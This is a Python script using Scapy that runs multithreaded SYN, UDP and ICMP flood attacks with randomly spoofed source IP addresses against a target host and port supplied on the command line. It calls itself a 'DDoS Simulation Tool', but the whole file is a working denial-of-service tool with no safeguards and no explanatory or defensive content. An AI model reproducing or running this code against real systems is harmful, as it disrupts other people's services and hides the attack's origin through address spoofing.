#!/usr/bin/env python3
import sys
import time
import random
import argparse
import threading
import logging
import socket
import struct

# Suppress Scapy warning
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def get_random_ip():
    """Generate a random IP address."""
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def syn_flood(target_ip, target_port, num_packets):
    """
    Perform SYN Flood attack with spoofed source IPs.
    """
    for _ in range(num_packets):
        # Generate random source IP and port
        src_ip = get_random_ip()
        src_port = random.randint(1024, 65535)

        # Create IP packet with spoofed source
        ip_layer = IP(src=src_ip, dst=target_ip)

        # Create TCP SYN packet
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))

        # Send packet
        send(ip_layer/tcp_layer, verbose=0)

def udp_flood(target_ip, target_port, num_packets):
    """
    Perform UDP Flood attack with spoofed source IPs.
    """
    for _ in range(num_packets):
        src_ip = get_random_ip()
        src_port = random.randint(1024, 65535)

        ip_layer = IP(src=src_ip, dst=target_ip)
        udp_layer = UDP(sport=src_port, dport=target_port)
        # Random payload
        payload = Raw(b"X" * random.randint(64, 1024))

        send(ip_layer/udp_layer/payload, verbose=0)

def icmp_flood(target_ip, num_packets):
    """
    Perform ICMP Flood (Ping Flood) with spoofed source IPs.
    """
    for _ in range(num_packets):
        src_ip = get_random_ip()

        ip_layer = IP(src=src_ip, dst=target_ip)
        icmp_layer = ICMP(type=8, code=0) # Echo Request
        payload = Raw(b"X" * 32)

        send(ip_layer/icmp_layer/payload, verbose=0)

def attack_worker(target_ip, target_port, attack_type, packets_per_thread, stop_event):
    """
    Worker thread function to execute attacks.
    """
    while not stop_event.is_set():
        try:
            if attack_type == "syn":
                syn_flood(target_ip, target_port, 10)
            elif attack_type == "udp":
                udp_flood(target_ip, target_port, 10)
            elif attack_type == "icmp":
                icmp_flood(target_ip, 10)
        except Exception as e:
            logger.error(f"Error in worker: {e}")
            time.sleep(0.1)

def main():
    parser = argparse.ArgumentParser(description="Scapy DDoS Simulation Tool with IP Spoofing")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--type", choices=["syn", "udp", "icmp"], required=True, help="Attack type")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads (default: 4)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds (default: 60)")

    args = parser.parse_args()

    logger.info(f"Starting {args.type.upper()} flood on {args.target}:{args.port} with {args.threads} threads for {args.duration}s")

    stop_event = threading.Event()
    threads = []

    # Start threads
    for i in range(args.threads):
        t = threading.Thread(target=attack_worker, args=(args.target, args.port, args.type, 100, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    finally:
        stop_event.set()
        logger.info("Stopping attack...")
        for t in threads:
            t.join(timeout=1.0)
        logger.info("Attack finished")

if __name__ == "__main__":
    # Check for root privileges (needed for Scapy to send packets)
    if os.geteuid() != 0:
        logger.error("This script requires root privileges to send spoofed packets.")
        sys.exit(1)
    main()
